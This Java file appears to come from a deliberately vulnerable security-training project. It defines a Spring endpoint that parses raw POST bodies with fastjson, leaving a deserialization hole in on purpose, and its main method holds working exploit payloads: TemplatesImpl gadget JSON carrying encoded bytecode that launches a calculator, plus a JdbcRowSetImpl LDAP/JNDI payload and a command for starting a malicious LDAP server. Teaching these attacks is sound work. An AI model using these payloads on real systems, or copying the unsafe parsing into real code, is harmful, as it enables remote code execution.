package com.madaha.codesecone.controller.AdvancedAttack.deserialize;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.parser.Feature;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.ResponseBody;

@Controller
@RequestMapping("/fastjson")
public class FastJson {

    @RequestMapping(value = "/deSerializeVul", method = {RequestMethod.POST})
    @ResponseBody
    public String deSerializeVul(@RequestBody String params){
        // 如果Content-Type不设置application/json格式，post数据会被url编码
        try {
            // 将post提交的string转为json
            JSONObject ob = JSON.parseObject(params);
            return ob.get("name").toString();
        } catch (Exception e){
            return e.toString();
        }
    }


    public static void main(String[] args){

        // Open calc in mac
//        String payload = "{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\", \"_bytecodes\": [\"yv66vgAAADEAOAoAAwAiBwA2BwAlBwAmAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBa0gk/OR3e8+AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAMSW5uZXJDbGFzc2VzAQAzTG1lL2xpZ2h0bGVzcy9mYXN0anNvbi9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQ7AQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHACcBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAhFeHAuamF2YQwACgALBwAoAQAxbWUvbGlnaHRsZXNzL2Zhc3Rqc29uL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAHW1lL2xpZ2h0bGVzcy9mYXN0anNvbi9HYWRnZXRzAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAKgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMACwALQoAKwAuAQASb3BlbiAtYSBDYWxjdWxhdG9yCAAwAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAMgAzCgArADQBAA9saWdodGxlc3MvcHduZXIBABFMbGlnaHRsZXNzL3B3bmVyOwAhAAIAAwABAAQAAQAaAAUABgABAAcAAAACAAgABAABAAoACwABAAwAAAAvAAEAAQAAAAUqtwABsQAAAAIADQAAAAYAAQAAADwADgAAAAwAAQAAAAUADwA3AAAAAQATABQAAgAMAAAAPwAAAAMAAAABsQAAAAIADQAAAAYAAQAAAD8ADgAAACAAAwAAAAEADwA3AAAAAAABABUAFgABAAAAAQAXABgAAgAZAAAABAABABoAAQATABsAAgAMAAAASQAAAAQAAAABsQAAAAIADQAAAAYAAQAAAEIADgAAACoABAAAAAEADwA3AAAAAAABABUAFgABAAAAAQAcAB0AAgAAAAEAHgAfAAMAGQAAAAQAAQAaAAgAKQALAAEADAAAABsAAwACAAAAD6cAAwFMuAAvEjG2ADVXsQAAAAAAAgAgAAAAAgAhABEAAAAKAAEAAgAjABAACQ==\"], \"_name\": \"lightless\", \"_tfactory\": { }, \"_outputProperties\":{ }}";
//        JSON.parseObject(payload, Feature.SupportNonPublicField);

        /**
         * Open calc in windows：
         *
         * TemplatesImpl反序列化链利用：
         *      注意：这里的exp是有要求的，想要使用TemplatesImpl进行Exploit，那就必须要继承AbstractTranslet！！！
         *
         * 参考链接：
         *      https://github.com/F3eev/fastjson_test
         *      https://www.javasec.org/java-vuls/FastJson.html#%E5%9B%9B%E3%80%81payload
         *
         * 直接把具体原因放在这里，F3eev师傅的代码：
         *      1.parseObject函数导致反序列化执行命令原始利用@type特性构造函数User()或者setter()函数可控的条件下才能触发，如下表达式text可控,这个表达式在实战中应用很少。 JSON.parseObject(text,Object.class);
         *      2.后来研究人员发现TemplatesImpl可利用完成攻击，利用条件比较苛刻. 默认fastjson只会反序列化公开的属性和域而com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl中_bytecodes却是私有属性，所以在parseObject的时候需要设置Feature.SupportNonPublicField，这样_bytecodes字段才会被反序列化，也就是如下text1可控 Object obj2 = JSON.parseObject(text1,Feature.SupportNonPublicField);
         *      3.利用rmi、ldap实现攻击,可控代码JSON.parse(code)利用场景较多。
         */
        String payload = "{\n" +
                "    \"@type\": \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\n" +
                "    \"_bytecodes\": [\"yv66vgAAADQALwoACQAWCgAXABgIABkKABcAGgkAGwAcCAAdCgAeAB8HACAHACEBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQAKRXhjZXB0aW9ucwcAIgEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAY8aW5pdD4BAAMoKVYHACMBAApTb3VyY2VGaWxlAQAaVGVtcGxhdGVzSW1wbF9FeHBsb2l0LmphdmEMABEAEgcAJAwAJQAmAQAIY2FsYy5leGUMACcAKAcAKQwAKgArAQATSGVsbG8gVGVtcGxhdGVzSW1wbAcALAwALQAuAQAVVGVtcGxhdGVzSW1wbF9FeHBsb2l0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvaW8vSU9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEACAAJAAAAAAADAAEACgALAAIADAAAABkAAAADAAAAAbEAAAABAA0AAAAGAAEAAAAOAA4AAAAEAAEADwABAAoAEAACAAwAAAAZAAAABAAAAAGxAAAAAQANAAAABgABAAAAEQAOAAAABAABAA8AAQARABIAAgAMAAAAOgACAAEAAAAWKrcAAbgAAhIDtgAEV7IABRIGtgAHsQAAAAEADQAAABIABAAAABMABAAVAA0AFgAVABcADgAAAAQAAQATAAEAFAAAAAIAFQ==\"],\n" +
                "    '_name': 'madaha',\n" +
                "    '_tfactory': {},\n" +
                "    \"_outputProperties\": {},\n" +
                "}";
        JSON.parseObject(payload, Feature.SupportNonPublicField);

        /**
         * Open calc in windows：
         *
         * JdbcRowSetImpl反序列化链进行 ldap 利用：
         *      利用rmi、ldap实现攻击,可直接使用 JSON.parse(code) 进行利用，无需开启 Feature.SupportNonPublicField ！！！
         *
         * 利用方式，直接开启ldap恶意服务：
         *      java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "calc" -A "127.0.0.1"
         * */
        String PoC = "{\n" +
                "    \"@type\": \"com.sun.rowset.JdbcRowSetImpl\",\n" +
                "    \"dataSourceName\": \"ldap://127.0.0.1:1389/m6llip\",\n" +
                "    \"autoCommit\": true\n" +
                "}";
//        JSON.parse(PoC);
    }
}